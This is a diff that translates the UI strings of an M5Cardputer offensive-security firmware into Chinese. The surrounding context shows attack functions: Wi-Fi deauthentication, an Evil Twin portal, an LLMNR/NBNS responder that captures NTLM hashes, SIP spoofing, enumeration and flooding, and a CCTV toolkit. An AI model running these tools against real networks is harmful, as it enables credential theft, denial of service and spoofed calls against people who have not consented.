         M5.Display.setCursor(5, 20);
-        M5.Display.println("File not found:");
+        M5.Display.println("未找到文件:");
         M5.Display.println(filePath);
-        waitAndReturnToMenu("return to menu");
+        waitAndReturnToMenu("返回菜单");
         return;
     }
 
@@ -19152,12 +19380,12 @@ void printFile() {
     if (printerIPs.empty()) {
         M5.Display.clear();
         M5.Display.setCursor(5, 20);
-        M5.Display.println("No printers detected");
-        M5.Display.println("or configured.");
-        M5.Display.println("Returning to menu...");
+        M5.Display.println("未检测到打印机");
+        M5.Display.println("或未配置。");
+        M5.Display.println("正在返回菜单...");
         M5.Display.display();
         delay(2000);
-        waitAndReturnToMenu("return to menu");
+        waitAndReturnToMenu("返回菜单");
         return;
     }
 
@@ -19166,10 +19394,10 @@ void printFile() {
     if (!confirmPopup(message)) {
         M5.Display.clear();
         M5.Display.setCursor(5, 20);
-        M5.Display.println("Operation cancelled by user.");
+        M5.Display.println("用户取消了操作。");
         M5.Display.display();
         delay(2000);
-        waitAndReturnToMenu("return to menu");
+        waitAndReturnToMenu("返回菜单");
         return;
     }
 
@@ -19178,12 +19406,12 @@ void printFile() {
     if (!file) {
         M5.Display.clear();
         M5.Display.setCursor(5, 20);
-        M5.Display.println("Failed to open file:");
+        M5.Display.println("打开文件失败:");
         M5.Display.println(filePath);
-        M5.Display.println("Returning to menu...");
+        M5.Display.println("正在返回菜单...");
         M5.Display.display();
         delay(2000);
-        waitAndReturnToMenu("return to menu");
+        waitAndReturnToMenu("返回菜单");
         return;
     }
 
@@ -19200,7 +19428,7 @@ void printFile() {
         // Display current status on the screen
         M5.Display.clear();
         M5.Display.setCursor(5, 20);
-        M5.Display.println("Printing to:");
+        M5.Display.println("正在打印至:");
         M5.Display.println(printerIP.toString());
         M5.Display.display();
         delay(200);
@@ -19223,11 +19451,11 @@ void printFile() {
     // Confirm operation completion
     M5.Display.clear();
     M5.Display.setCursor(5, 20);
-    M5.Display.println("Print job completed");
-    M5.Display.println("on all printers!");
+    M5.Display.println("打印任务完成");
+    M5.Display.println("已在所有打印机完成！");
     M5.Display.display();
     delay(2000);
-    waitAndReturnToMenu("return to menu");
+    waitAndReturnToMenu("返回菜单");
 }
 
 
@@ -19518,7 +19746,7 @@ void checkPrinterStatus() {
     bool needsDisplayUpdate = true;
 
     if (WiFi.localIP().toString() == "0.0.0.0") {
-      waitAndReturnToMenu("Not connected...");
+      waitAndReturnToMenu("未连接网络...");
       return;
     }
 
@@ -19660,7 +19888,7 @@ void checkPrinterStatus() {
         delay(50);
     }
 
-    waitAndReturnToMenu("return to menu");
+    waitAndReturnToMenu("返回菜单");
 }
 
 
@@ -19680,11 +19908,11 @@ void startHoneypot() {
     honeypotServer.begin();
     Serial.println("Fake Telnet service started on port " + String(honeypotPort));
     M5.Display.clear(); // Effacer l'écran
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 5);
     M5.Display.setTextColor(menuTextUnFocusedColor);
-    M5.Display.println("Honeypot Started !");
-    M5.Display.println("Waiting interaction...");
+    M5.Display.println("蜜罐已启动！");
+    M5.Display.println("等待交互请求...");
     while (true) {
         cardUpdate();
         honeypotLoop();   
@@ -19695,7 +19923,7 @@ void startHoneypot() {
     }
     honeypotServer.stop();
     Serial.println(F("Honeypot stopped."));
-    waitAndReturnToMenu("Honeypot stopped.");
+    waitAndReturnToMenu("蜜罐已停止。");
 }
 
 // -- Main loop to check for incoming clients --
@@ -19760,7 +19988,7 @@ void logHoneypotCommand(String clientIP, String command) {
 // -- Helper function to redraw the screen with all logs in the buffer --
 void redrawScreenWithLogs() {
     M5.Display.clear(); // Effacer l'écran
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 5);
     M5.Display.setTextColor(menuTextUnFocusedColor);
     
@@ -20466,9 +20694,9 @@ void sdToUsb() {
 
   // Affichage sur l'écran
   M5.Display.fillScreen(TFT_BLACK);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setCursor(5, 5);
-  M5.Display.println("Mounting SDCard on USB, please wait...");
+  M5.Display.println("正在将SD卡挂载到USB，请稍候...");
 
   // Attente active jusqu'à ce que l'USB soit monté et stable
   // On attend que tud_mounted() retourne true de manière continue pendant 1 seconde
@@ -20486,7 +20714,7 @@ void sdToUsb() {
     delay(10);
   }
 
-  waitAndReturnToMenu("SD mounted on USB");
+  waitAndReturnToMenu("SD卡已挂载至USB");
 }
 
 
@@ -20653,13 +20881,13 @@ void captureAssociatedBeacon(uint8_t *bssidTarget) {
 void displayAPInfo(String ssid, String bssid, String security, int32_t rssi, int32_t channel) {
   M5.Lcd.clear();
   M5.Lcd.setCursor(0, 10);
-  M5.Lcd.setTextSize(1.5);
+  evilSetCnFont(M5.Lcd, 1.5);
 
-  M5.Lcd.println("== AP Information ==");
-  M5.Lcd.printf("Channel: %d\n", channel);
+  M5.Lcd.println("== 热点信息 ==");
+  M5.Lcd.printf("信道: %d\n", channel);
   M5.Lcd.printf("SSID:%s\n", ssid.c_str());
   M5.Lcd.printf("MAC:%s\n", bssid.c_str());
-  M5.Lcd.printf("Security:%s\n", security.c_str());
+  M5.Lcd.printf("安全类型: %s\n", security.c_str());
   M5.Lcd.printf("RSSI: %d dBm\n", rssi);
   M5.Lcd.printf("EAPOL: %d", nombreDeEAPOLAuto);
 }
@@ -20742,7 +20970,7 @@ void autoDeauther() {
 
   M5Cardputer.Display.fillScreen(TFT_BLACK);
   M5Cardputer.Display.setCursor(0, 0);
-  M5Cardputer.Display.setTextSize(1.5);
+  evilSetCnFont(M5Cardputer.Display, 1.5);
 
   // Load whitelist from config so KarmaAutoWhitelist applies to AutoDeauther
   // Uses the same config key: KarmaAutoWhitelist=SSID1,SSID2,pa*tern
@@ -20840,7 +21068,7 @@ void autoDeauther() {
 
       M5.Lcd.clear();
       M5.Lcd.setCursor(10, 10);
-      M5.Lcd.printf("Current Channel: %d", channel);
+      M5.Lcd.printf("当前信道: %d", channel);
       M5.Lcd.println(" ");
       M5.Lcd.println(" ");
       M5.Lcd.println(" ");
@@ -20854,7 +21082,7 @@ void autoDeauther() {
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
 
-  waitAndReturnToMenu("Stopping AutoDeauth");  // retour au menu principal
+  waitAndReturnToMenu("正在停止自动解除认证");  // retour au menu principal
 }
 
 
@@ -20874,18 +21102,18 @@ void runMouseJiggler() {
 
   M5.Display.clear();
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(70, 50);
-  M5.Display.println("Jiggling...");
+  M5.Display.println("鼠标防休眠抖动中...");
 
   // Affichage du délai et du mouvement
   auto displayInfo = []() {
     M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
     M5.Display.fillRect(0, 0, M5.Display.width(), 24, BLACK);  // Ajusté pour deux lignes
     M5.Display.setCursor(50, 0);
-    M5.Display.printf("< Delay:%lums >     ", delayBetweenMoves);
+    M5.Display.printf("< 间隔:%lums >     ", delayBetweenMoves);
     M5.Display.setCursor(50, 20);
-    M5.Display.printf("^  Move:%dpx  v    ", moveAmount);  };
+    M5.Display.printf("^  步长:%dpx  v    ", moveAmount);  };
 
   // Animation lapin
   auto drawBunny = [](int frame) {
@@ -20964,7 +21192,7 @@ void runMouseJiggler() {
   }
 
   Mouse.end();
-  waitAndReturnToMenu("Stopping MouseJiggler");
+  waitAndReturnToMenu("正在停止鼠标抖动器");
 }
 
 /*
@@ -20989,11 +21217,11 @@ void startEvilTwin(int index) {
     WiFi.mode(WIFI_MODE_APSTA);
     
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 10);
-    M5.Display.println("== Evil Twin Mode ==");
+    M5.Display.println("== 恶意孪生热点模式 ==");
     M5.Display.println("SSID : " + targetSSID);
-    M5.Display.println("Channel : " + String(targetChannel));
+    M5.Display.println("信道 : " + String(targetChannel));
 
     int packetCount = 0;
     unsigned long lastUpdate = 0;
@@ -21013,8 +21241,8 @@ void startEvilTwin(int index) {
 
             M5.Display.fillRect(0, 60, 240, 40, menuBackgroundColor);
             M5.Display.setCursor(5, 60);
-            M5.Display.printf("Deauth : %d\n", packetCount);
-            M5.Display.printf("Client : %d\n", clients);
+            M5.Display.printf("解认证包: %d\n", packetCount);
+            M5.Display.printf("连接客户端: %d\n", clients);
 
             lastUpdate = millis();
         }
@@ -21022,7 +21250,7 @@ void startEvilTwin(int index) {
     }
 
     stopCaptivePortal();
-    waitAndReturnToMenu("Evil Twin Stopped");
+    waitAndReturnToMenu("恶意孪生热点已停止");
 }
 
 
@@ -21077,7 +21305,7 @@ String encodeBase64(const String& input) {
 void evilLLMChatStream() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
     Serial.println(F("[INFO] Not connected to a network."));
-    waitAndReturnToMenu("Not connected to a network.");
+    waitAndReturnToMenu("未连接到网络。");
     return;
   }
 
@@ -21090,7 +21318,7 @@ void evilLLMChatStream() {
 
   M5.Display.clear();
   M5.Display.setCursor(5, 5);
-  M5.Display.println("Prompt >");
+  M5.Display.println("输入提示词 >");
 
   while (true) {
     String userPrompt = getUserInput("Prompt > ");
@@ -21101,7 +21329,7 @@ void evilLLMChatStream() {
     client.setTimeout(10000);
 
     if (!client.connect(llmHost.c_str(), llmhttpsPort)) {
-      waitAndReturnToMenu("Connection failed.");
+      waitAndReturnToMenu("连接服务器失败。");
       return;
     }
 
@@ -21124,8 +21352,8 @@ void evilLLMChatStream() {
 
     M5.Display.clear();
     M5.Display.setCursor(5, 5);
-    M5.Display.println("Send.");
-    M5.Display.println("Waiting answer...");
+    M5.Display.println("已发送。");
+    M5.Display.println("等待AI回复...");
 
     client.print(request);
 
@@ -21149,14 +21377,14 @@ void evilLLMChatStream() {
       // Interruption utilisateur
       if (kp(KEY_BACKSPACE)) {
         client.stop();
-        waitAndReturnToMenu("Stream interrupted by user");
+        waitAndReturnToMenu("用户中断了流式传输");
         return;
       }
 
       // Timeout si aucun token received
       if (!gotFirstToken && millis() - streamStart > 10000) {
         client.stop();
-        waitAndReturnToMenu("LLM not responding (timeout)");
+        waitAndReturnToMenu("大模型无响应 (超时)");
         return;
       }
 
@@ -21268,12 +21496,12 @@ void evilLLMChatStream() {
       cardUpdate();
 
       if (kp(KEY_BACKSPACE)) {
-        waitAndReturnToMenu("evilChatStream Stopped");
+        waitAndReturnToMenu("大模型终端已停止");
         return;
       } else if (kp(KEY_ENTER)) {
         M5.Display.clear();
         M5.Display.setCursor(5, 5);
-        M5.Display.println("Prompt >");
+        M5.Display.println("输入提示词 >");
         break;
       } else if (kp(';') && scrollOffset > 0) {
         scrollOffset--;
@@ -21424,7 +21652,7 @@ void drawChatWindow() {
     M5.Display.fillScreen(TFT_BLACK);
     M5.Display.setTextColor(TFT_GREEN);
     M5.Display.setCursor(5, 5);
-    M5.Display.printf("Connected: %d", nodesCount);
+    M5.Display.printf("在线节点: %d", nodesCount);
 
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.setCursor(5, 10);
@@ -21575,7 +21803,7 @@ void checkPresenceTimeouts() {
     for (int i = 0; i < nodesCount; ++i)
         if ((now - nodesConnected[i].lastSeen) > TIMEOUT_PRESENCE) {
             char m[MAX_MSG_LEN];
-            snprintf(m, sizeof(m), "%s left the chat!", nodesConnected[i].nick);
+            snprintf(m, sizeof(m), "%s 离开了聊天！", nodesConnected[i].nick);
             broadcastChatMessage("System", m);
 
             for (int j = i; j < nodesCount-1; ++j)
@@ -21624,7 +21852,7 @@ void handleKeyboard() {
 void EvilChatMesh() {
     auto cfg = M5.config();
     M5.begin(cfg);
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.fillScreen(TFT_BLACK);
 
@@ -21632,7 +21860,7 @@ void EvilChatMesh() {
     WiFi.mode(WIFI_STA);
 
     if (esp_now_init() != ESP_OK) {
-        M5.Display.println("ESP‑NOW init failed"); return;
+        M5.Display.println("ESP-NOW 初始化失败"); return;
     }
     esp_now_register_recv_cb(OnDataRecvChat);
 
@@ -21647,7 +21875,7 @@ void EvilChatMesh() {
     drawChatWindow();
 
     char msgArr[MAX_MSG_LEN];
-    snprintf(msgArr, sizeof(msgArr), "%s enter the chat!", currentNick);
+    snprintf(msgArr, sizeof(msgArr), "%s 加入了聊天！", currentNick);
     broadcastChatMessage("System", msgArr);
 
     /* ---------- Boucle ---------- */
@@ -21680,12 +21908,12 @@ void EvilChatMesh() {
         /* 4. touche ` pour quitter */
         if (kp('`')) {
             char m[MAX_MSG_LEN];
-            snprintf(m, sizeof(m), "%s left the chat!", currentNick);
+            snprintf(m, sizeof(m), "%s 离开了聊天！", currentNick);
             broadcastChatMessage("System", m);
 
             esp_now_unregister_recv_cb();
             esp_now_deinit();
-            waitAndReturnToMenu("Left the chat...");
+            waitAndReturnToMenu("已退出聊天...");
             return;
         }
         delay(10);
@@ -22195,10 +22423,10 @@ void showWaitingAnimation() {
   auto& d = M5Cardputer.Display;
 
   // texte d’état
-  d.setTextSize(1.5);
+  evilSetCnFont(d, 1.5);
   d.setTextColor(TFT_WHITE, TFT_BLACK);
   d.setCursor(5, 5);
-  d.print("Waiting for LLMNR or NBNS");
+  d.print("等待 LLMNR / NBNS 请求");
 
   // position et rayon du radar
   int screenW = d.width();
@@ -22255,10 +22483,10 @@ void showWaitingAnimation() {
   d.fillRect(0, yPos, screenW, 12, TFT_BLACK);
 
   // --- Affichage “Asked” ---
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(TFT_WHITE, TFT_BLACK);
   d.setCursor(2, yPos);
-  d.print("Request: ");
+  d.print("查询目标: ");
   d.print(lastQueryName);
 }
 
@@ -22322,39 +22550,39 @@ void updateHashUI() {
   d.fillScreen(BLACK);
 
   // 1) NTLM count
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setTextColor(WHITE, BLACK);
   d.setCursor(5, 5);
   d.print("NTLM: ");
-  d.setTextSize(2);
+  evilSetCnFont(d, 2);
   d.print(hashCount);
 
   // 2) User
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 30);
-  d.print("User: ");
-  d.setTextSize(2);
+  d.print("用户名: ");
+  evilSetCnFont(d, 2);
   d.print(lastUser);
 
   // 3) Domain
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 55);
-  d.print("Domain: ");
-  d.setTextSize(2);
+  d.print("域名: ");
+  evilSetCnFont(d, 2);
   d.print(lastDomain);
 
   // 4) Client (hostname)
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 80);
-  d.print("Client: ");
-  d.setTextSize(2);
+  d.print("客户端: ");
+  evilSetCnFont(d, 2);
   d.print(lastClient);
 
   // 5) Query (NBNS/LLMNR + name)
-  d.setTextSize(1.3);
+  evilSetCnFont(d, 1.3);
   d.setCursor(5, 105);
   d.print(lastQueryProtocol + ": ");
-  d.setTextSize(2);
+  evilSetCnFont(d, 2);
   d.print(lastQueryName);
 }
 
@@ -22821,7 +23049,7 @@ void responder() {
 }
   detCount = 0;
 
-  waitAndReturnToMenu("Return to menu");
+  waitAndReturnToMenu("返回菜单");
 }
 
 
@@ -22889,7 +23117,7 @@ void previewTextFile(const char *path) {
       // Afficher l’en‐tête avec le nom du fichier (en jaune)
       M5.Display.setCursor(5, areaY);
       M5.Display.setTextColor(TFT_YELLOW);
-      M5.Display.print("Fichier: ");
+      M5.Display.print("文件: ");
       M5.Display.println(filename);
       M5.Display.drawLine(areaX, areaY + 12, areaW, areaY + 12, TFT_DARKGREY);
 
@@ -23006,7 +23234,7 @@ void fileManager() {
         M5.Display.fillRect(0, 13, 240, 122, TFT_BLACK);
         M5.Display.setCursor(5, 13);
         M5.Display.setTextColor(TFT_YELLOW);
-        M5.Display.print("DIR: ");
+        M5.Display.print("目录: ");
         M5.Display.println(fmCurrentPath);
         M5.Display.drawLine(0, 25, 240, 25, TFT_DARKGREY);
 
@@ -23105,7 +23333,7 @@ void fileManager() {
           String fullPath = fmCurrentPath + "/" + sel;
           // Appeler votre popup de confirmation
           char buf[64];
-          snprintf(buf, sizeof(buf), "Delete %s ?", sel.c_str());
+          snprintf(buf, sizeof(buf), "确认删除 %s ?", sel.c_str());
           if (confirmPopup(buf)) {
             // Si l'utilisateur confirme
             if (SD.exists(fullPath.c_str())) {
@@ -23251,7 +23479,7 @@ void drainUART() {
  * -------------------------------------------------------------------------- */
 void renderScreen() {
   M5Cardputer.Display.clear();
-  M5Cardputer.Display.setTextSize(1);
+  evilSetCnFont(M5Cardputer.Display, 1);
   M5Cardputer.Display.setTextColor(WHITE, BLACK);
   M5Cardputer.Display.setCursor(0, 0);
 
@@ -23335,14 +23563,14 @@ void pushChar(uint8_t c) {
 void drawBaudMenu(int idx) {
   const int MENU_SZ = NB_BAUD + 1;
   M5Cardputer.Display.clear();
-  M5Cardputer.Display.setTextSize(1);
+  evilSetCnFont(M5Cardputer.Display, 1);
   M5Cardputer.Display.setCursor(0, 0);
   M5Cardputer.Display.setTextColor(WHITE, BLACK);
-  M5Cardputer.Display.println(F("Choose baudrate :"));
+  M5Cardputer.Display.println(F("选择波特率:"));
 
   for (int i = 0; i < MENU_SZ; ++i) {
     M5Cardputer.Display.print((i == idx) ? F("> ") : F("  "));
-    if (i == 0)   M5Cardputer.Display.println(F("Auto-detect"));
+    if (i == 0)   M5Cardputer.Display.println(F("自动探测"));
     else          M5Cardputer.Display.printf("%d bps\n", BAUD_LIST[i - 1]);
   }
   M5Cardputer.Display.display();
@@ -23376,9 +23604,9 @@ int detectBaud() {
 
   M5Cardputer.Display.clear();
   M5Cardputer.Display.setCursor(0, 0);   // <<< corrigeait M5.Display.*
-  M5Cardputer.Display.setTextSize(1);
+  evilSetCnFont(M5Cardputer.Display, 1);
   M5Cardputer.Display.setTextColor(WHITE, BLACK);
-  M5Cardputer.Display.print(F("Scanning baud "));
+  M5Cardputer.Display.print(F("正在探测波特率 "));
   int spinX = M5Cardputer.Display.getCursorX();
   int spinY = M5Cardputer.Display.getCursorY();
   M5Cardputer.Display.display();
@@ -23427,7 +23655,7 @@ void startUARTShell() {
 
   /* ---------- Sélection / détection du baudrate ---------- */
   int sel = selectBaudMenu();
-  if (sel == -2) { waitAndReturnToMenu("Canceled"); return; }
+  if (sel == -2) { waitAndReturnToMenu("已取消"); return; }
   autoBaud = (sel == -1) ? detectBaud() : sel;
   if (autoBaud <= 0) autoBaud = 115200;
 
@@ -23446,7 +23674,7 @@ void startUARTShell() {
     Serial.println("Unknown board type");
   }
   /* ---------- Hauteur glyph + lignes visibles ---------- */
-  M5Cardputer.Display.setTextSize(1);                 // police « Small »
+  evilSetCnFont(M5Cardputer.Display, 1);                 // police « Small »
   #if defined(M5GFX_VERSION)
     glyphH = M5Cardputer.Display.fontHeight();          // API récente
   #else
@@ -23567,7 +23795,7 @@ void startUARTShell() {
   uartAuto.end();
   cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
   uartShellRun = false;
-  waitAndReturnToMenu("Back to menu");
+  waitAndReturnToMenu("返回菜单");
 }
 
 
@@ -23634,7 +23862,7 @@ String readSIPResp(unsigned long tout = 500) {
 /* ===== Saisie clavier Cardputer – UTF-8 safe ========================= */
 String promptInput(const char *prompt) {
   String input = "";
-  M5.Display.clear(); M5.Display.setTextSize(1.5);
+  M5.Display.clear(); evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
   M5.Display.setCursor(5, 5); M5.Display.println(prompt);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
@@ -23717,11 +23945,11 @@ bool parseTarget(const String &s, uint32_t &outNet,
 void sipScan() {
   inMenu = false;
 
-  String tgt = promptInput("IP ou CIDR > ");
-  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }
+  String tgt = promptInput("输入目标 IP 或 CIDR > ");
+  if (tgt.isEmpty()) { waitAndReturnToMenu("已取消"); return; }
 
   uint32_t net, first, last;
-  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad IP/CIDR"); return; }
+  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("IP或CIDR格式无效"); return; }
 
   sipUdp.begin(LOCAL_SIP_EP);
   uint16_t ok = 0, ko = 0;
@@ -23750,7 +23978,7 @@ void sipScan() {
     M5.Display.printf("OK:%u  KO:%u", ok, ko); M5.Display.display();
   }
   sipUdp.stop();
-  waitAndReturnToMenu("Scan done  OK:" + String(ok) + "  KO:" + String(ko));
+  waitAndReturnToMenu("扫描完成 存活:" + String(ok) + " 离线:" + String(ko));
 }
 
 
@@ -23761,10 +23989,10 @@ void sipScan() {
 void sipEnumExtensions() {
   /* ---------- saisie paramètres ---------- */
   IPAddress pbx;
-  String ip = promptInput("PBX IP > ");
-  if (!pbx.fromString(ip)) { waitAndReturnToMenu("Bad IP"); return; }
+  String ip = promptInput("输入 PBX 服务器 IP > ");
+  if (!pbx.fromString(ip)) { waitAndReturnToMenu("IP地址无效"); return; }
 
-  String mode = promptInput("Mode: 1=Range  2=Wordlist > ");
+  String mode = promptInput("模式: 1=分机范围  2=字典 > ");
 
   /* ---------- préparation affichage ---------- */
   constexpr int  lineH   = 14;
@@ -23773,9 +24001,9 @@ void sipEnumExtensions() {
   int yCursor           = yStart;
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Display.setCursor(5, 5);  M5.Display.println("Enum running…");
+  M5.Display.setCursor(5, 5);  M5.Display.println("正在枚举分机…");
 
   M5.Display.startWrite();                       // évite le scintillement
 
@@ -23825,8 +24053,8 @@ void sipEnumExtensions() {
 
   /* ---------- mode 1 : plage numérique ---------- */
   if (mode == "1") {
-    uint16_t deb = promptInput("Start ext > ").toInt();
-    uint16_t fin = promptInput("End ext > ").toInt();
+    uint16_t deb = promptInput("起始分机号 > ").toInt();
+    uint16_t fin = promptInput("终止分机号 > ").toInt();
     for (uint16_t e = deb; e <= fin; ++e) { sendInviteAndCheck(String(e)); delay(40); }
 
   /* ---------- mode 2 : word-list intégrée ---------- */
@@ -23844,13 +24072,13 @@ void sipEnumExtensions() {
 
   } else {
     M5.Display.endWrite();
-    waitAndReturnToMenu("Invalid mode");
+    waitAndReturnToMenu("模式无效");
     return;
   }
 
   /* ---------- fin ---------- */
   M5.Display.endWrite();
-  waitAndReturnToMenu(String("Enum done – ") + found + " valid");
+  waitAndReturnToMenu(String("枚举完成 – 发现 ") + found + " 个分机");
 }
 
 
@@ -23860,11 +24088,11 @@ void sipEnumExtensions() {
 
 void sipSpoofMessage() {
   inMenu = false;
-  IPAddress pbx; String ip = promptInput("PBX IP > "); if (!pbx.fromString(ip)) {
-    waitAndReturnToMenu("Bad IP");
+  IPAddress pbx; String ip = promptInput("输入 PBX 服务器 IP > "); if (!pbx.fromString(ip)) {
+    waitAndReturnToMenu("IP地址无效");
     return;
   }
-  String dst = promptInput("Dest ext > "), fake = promptInput("Caller name > "), txt = promptInput("Text > ");
+  String dst = promptInput("目标分机 > "), fake = promptInput("伪造主叫名 > "), txt = promptInput("发送文本 > ");
   String body = txt + "\r\n";
   String pkt = "MESSAGE sip:" + dst + "@" + ip + " SIP/2.0\r\n"
                "Via: SIP/2.0/UDP " + WiFi.localIP().toString() + ";branch=" + genBranch() + "\r\n"
@@ -23873,7 +24101,7 @@ void sipSpoofMessage() {
                "Call-ID: " + genCallID() + "\r\nCSeq: 1 MESSAGE\r\nMax-Forwards: 70\r\n"
                "Content-Type: text/plain\r\nContent-Length: " + String(body.length()) + "\r\n\r\n" + body;
   sendSIP(pbx, pkt);
-  String resp = readSIPResp(); waitAndReturnToMenu(resp == "" ? "No answer" : resp);
+  String resp = readSIPResp(); waitAndReturnToMenu(resp == "" ? "无响应" : resp);
 }
 
 /* ======================================================================
@@ -23882,20 +24110,20 @@ void sipSpoofMessage() {
 void sipFlood() {
   inMenu = false; sipFloodStop = false;
 
-  String tgt = promptInput("IP ou CIDR > ");
-  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }
+  String tgt = promptInput("输入目标 IP 或 CIDR > ");
+  if (tgt.isEmpty()) { waitAndReturnToMenu("已取消"); return; }
 
   uint32_t net, first, last;
-  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad IP/CIDR"); return; }
+  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("IP或CIDR格式无效"); return; }
 
-  uint8_t pps = promptInput("Pkts/sec (1-50) > ").toInt();
+  uint8_t pps = promptInput("每秒发包数 (1-50) > ").toInt();
   uint32_t delayUS = 1000000UL / pps;
 
   sipUdp.begin(LOCAL_SIP_EP);
   uint32_t tot = 0;
 
   M5.Display.clear();
-  M5.Display.println("FLOOD - BACKSPACE to stop"); M5.Display.display();
+  M5.Display.println("洪水攻击中 - 按退格键停止"); M5.Display.display();
 
   for (uint32_t h = first; h <= last && !sipFloodStop; ++h) {
     IPAddress dst = ipFrom32(h);
@@ -23921,7 +24149,7 @@ void sipFlood() {
     M5.Display.printf("%s tot:%u", dst.toString().c_str(), tot); M5.Display.display();
   }
   sipUdp.stop();
-  waitAndReturnToMenu(sipFloodStop ? "Flood aborted" : "Sent " + String(tot));
+  waitAndReturnToMenu(sipFloodStop ? "攻击已中止" : "已发送 " + String(tot) + " 包");
 }
 
 
@@ -23931,15 +24159,15 @@ void sipFlood() {
 void sipRingAll() {
   inMenu = false;
 
-  String tgt = promptInput("CIDR ex 192.168.1.0/24 > ");
-  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }
+  String tgt = promptInput("输入 CIDR (如 192.168.1.0/24) > ");
+  if (tgt.isEmpty()) { waitAndReturnToMenu("已取消"); return; }
 
   uint32_t net, first, last;
   if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad CIDR"); return; }
 
-  uint16_t ringSec = promptInput("Ring duration s (5) > ").toInt();
+  uint16_t ringSec = promptInput("振铃时长 秒 (默认5) > ").toInt();
   if (ringSec == 0) ringSec = 5;
-  bool addSDP = promptInput("Add SDP ? y/N > ").startsWith("y");
+  bool addSDP = promptInput("附加 SDP 载荷? y/N > ").startsWith("y");
 
   sipUdp.begin(LOCAL_SIP_EP);
   struct CallMeta { IPAddress ip; String branch; String callid; };
@@ -23989,7 +24217,7 @@ void sipRingAll() {
     delay(1);
   }
   sipUdp.stop();
-  waitAndReturnToMenu("RingAll done (" + String(dlg.size()) + " INVITE)");
+  waitAndReturnToMenu("全部分机呼叫完成 (" + String(dlg.size()) + " 次INVITE)");
 }
 
 /*
@@ -24265,7 +24493,7 @@ void uiPrintAt(int16_t x, int16_t y, const String& s, uint16_t color) {
 
 void uiDrawHeader() {
   M5.Display.fillRect(0, 0, UI_W, UI_HEADER_H, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   uiPrintAt(0, 0, "CCTV ToolKit", menuTextFocusedColor);
   uiPrintAt(0, UI_TEXTSIZE, "Target: " + _ui.ip.toString(), menuTextUnFocusedColor);
   uiPrintAt(0, UI_TEXTSIZE * 2, "Phase: " + _ui.phase, menuTextFocusedColor);
@@ -24273,7 +24501,7 @@ void uiDrawHeader() {
 
 void uiDrawContent() {
   M5.Display.fillRect(0, UI_CONTENT_Y, UI_W, UI_CONTENT_H, TFT_BLACK);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   int linesToShow = min((int)_ui.lines.size(), uiMaxLines());
   int start = (int)_ui.lines.size() - linesToShow;
   for (int i = 0; i < linesToShow; ++i) {
@@ -24346,11 +24574,11 @@ int chooseScanModeMenu() {
   int index = 0;
   const int itemCount = 5 ;// ← augmenté
 const char* items[itemCount] = {
-    "Scan Local (LAN)",
-    "Scan IP unique (WAN)",
-    "Scan from file (SD)",
-    "MJPEG Live Viewer (SD)",
-    "Spycam Detector (WiFi)"
+    "1. 局域网扫描 (LAN)",
+    "2. 单IP扫描 (WAN)",
+    "3. 从SD文件扫描",
+    "4. MJPEG 实时视频流",
+    "5. 隐蔽摄像头探测 (WiFi)"
   };
 
   enterDebounce();
@@ -24362,10 +24590,10 @@ const char* items[itemCount] = {
 
     if (need) {
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-      M5.Display.println("CCTV ToolKit - Mode");
+      M5.Display.println("网络摄像头渗透工具箱");
       M5.Display.println("--------------------------");
       for (int i = 0; i < itemCount; ++i) {
         if (i == index) {
@@ -24398,16 +24626,16 @@ const char* items[itemCount] = {
 bool promptIPv4(IPAddress& out) {
   M5.Display.clear();
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Entrer IP (ex: 8.8.8.8)");
+  M5.Display.println("输入 IP (例如: 192.168.1.100)");
   M5.Display.display();
 
   String s = getUserInput();
   if (!out.fromString(s)) {
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("IP Adress invalid.");
+    M5.Display.println("IP 地址格式无效。");
     M5.Display.display();
     delay(1200);
